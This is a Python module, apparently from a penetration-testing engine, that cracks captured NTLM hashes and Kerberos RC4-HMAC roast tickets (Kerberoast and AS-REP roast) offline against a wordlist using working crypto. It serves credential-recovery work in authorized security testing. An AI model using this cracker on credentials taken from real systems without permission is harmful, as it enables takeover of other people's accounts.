"""Offline credential cracker (Phase E3) — real crypto, no external tool.

This is the *crack* rung of the credential lifecycle: captured material that is
not directly reusable (a Kerberos roast ticket) or that we want as plaintext (an
NT hash) is turned into a usable secret by trying candidate passwords **offline**.
Offline means no interaction with the target — no scope hit, no detection surface —
so it is the safe, deterministic complement to on-wire reuse.

The crypto is the genuine article, not a placeholder:

- **NT hash** — ``MD4(UTF-16-LE(password))``; a match recovers the plaintext for
  an account whose NTLM hash we dumped or DCSync'd.
- **Kerberos roast (RC4-HMAC, etype 23)** — the Kerberoast (``$krb5tgs$``, key
  usage 2) and AS-REP-roast (``$krb5asrep$``, key usage 8) formats hashcat calls
  modes 13100 / 18200. For each candidate we derive the RC4 key from its NT hash
  per RFC 4757 and verify the ticket's HMAC checksum — a match means the candidate
  is the account's password, so we now own that principal.

Only the standard library plus ``pycryptodome`` (already a dependency via impacket)
is used, so the offline cracker runs anywhere the engine does — including the
zero-external-services test suite.
"""

from __future__ import annotations

import hashlib
import hmac
import re
from collections.abc import Iterable

from Crypto.Cipher import ARC4
from Crypto.Hash import MD4

from ..logging import get_logger
from ..schemas.common import StrictModel

_log = get_logger("credentials.cracker")

#: RFC 4757 key usages for the RC4-HMAC roast formats we crack.
_KRB_USAGE_TGS_REP = 2   # $krb5tgs$  (Kerberoast — service ticket enc-part)
_KRB_USAGE_AS_REP = 8    # $krb5asrep$ (AS-REP roast — client enc-part)

#: hashcat 13100 — $krb5tgs$23$*user*realm*spn*$<checksum-hex>$<edata-hex>
_TGS_RE = re.compile(r"\$krb5tgs\$23\$.*?\$([0-9a-fA-F]{32})\$([0-9a-fA-F]+)", re.DOTALL)
#: hashcat 18200 — $krb5asrep$23$user@realm:<checksum-hex>$<edata-hex>
#: (the checksum separator is ':' or '$' depending on the tool that emitted it)
_ASREP_RE = re.compile(r"\$krb5asrep\$23\$.*?[:$]([0-9a-fA-F]{32})\$([0-9a-fA-F]+)", re.DOTALL)


class CrackResult(StrictModel):
    """Outcome of a crack attempt."""

    cracked: bool
    #: Recovered plaintext (only when ``cracked``); never logged at info level.
    plaintext: str | None = None
    #: How many candidates were tried (for reporting effort / coverage honesty).
    tried: int = 0


def nt_hash(password: str) -> bytes:
    """The NTLM hash of a password: ``MD4(UTF-16-LE(password))`` (16 bytes)."""

    return MD4.new(password.encode("utf-16-le")).digest()


def _hmac_md5(key: bytes, msg: bytes) -> bytes:
    return hmac.new(key, msg, hashlib.md5).digest()


def _rc4_roast_matches(key: bytes, checksum: bytes, edata: bytes, usage: int) -> bool:
    """True if ``key`` (an NT hash) decrypts an RC4-HMAC roast blob (RFC 4757).

    K1 = HMAC(key, usage_LE); K3 = HMAC(K1, checksum); the ticket is valid for
    this key iff HMAC(K1, RC4_decrypt(K3, edata)) == checksum.
    """

    k1 = _hmac_md5(key, usage.to_bytes(4, "little"))
    k3 = _hmac_md5(k1, checksum)
    plaintext = ARC4.new(k3).decrypt(edata)
    return hmac.compare_digest(_hmac_md5(k1, plaintext), checksum)


class HashCracker:
    """Cracks captured material against a candidate wordlist — offline, real crypto."""

    def crack_nt(self, target_hash: str, wordlist: Iterable[str]) -> CrackResult:
        """Recover the plaintext for an NT hash (hex, 32 chars) if in the wordlist."""

        want = target_hash.strip().lower()
        tried = 0
        for candidate in wordlist:
            tried += 1
            if nt_hash(candidate).hex() == want:
                _log.info("nt hash cracked", tried=tried)
                return CrackResult(cracked=True, plaintext=candidate, tried=tried)
        return CrackResult(cracked=False, tried=tried)

    def crack_kerberos(self, roast: str, wordlist: Iterable[str]) -> CrackResult:
        """Recover the plaintext for a Kerberos roast blob (``$krb5tgs$`` / ``$krb5asrep$``).

        Auto-detects TGS-REP vs AS-REP (they differ only in key usage) and tries
        each candidate's NT-hash-derived RC4 key against the ticket's checksum.
        """

        parsed = self._parse_roast(roast)
        if parsed is None:
            _log.warning("unrecognized kerberos roast format")
            return CrackResult(cracked=False, tried=0)
        checksum, edata, usage = parsed
        tried = 0
        for candidate in wordlist:
            tried += 1
            if _rc4_roast_matches(nt_hash(candidate), checksum, edata, usage):
                _log.info("kerberos ticket cracked", tried=tried, usage=usage)
                return CrackResult(cracked=True, plaintext=candidate, tried=tried)
        return CrackResult(cracked=False, tried=tried)

    @staticmethod
    def _parse_roast(roast: str) -> tuple[bytes, bytes, int] | None:
        """(checksum, edata, key_usage) for a roast blob, or None if unrecognized."""

        blob = roast.strip()
        m = _TGS_RE.search(blob)
        if m is not None:
            return bytes.fromhex(m.group(1)), bytes.fromhex(m.group(2)), _KRB_USAGE_TGS_REP
        m = _ASREP_RE.search(blob)
        if m is not None:
            return bytes.fromhex(m.group(1)), bytes.fromhex(m.group(2)), _KRB_USAGE_AS_REP
        return None
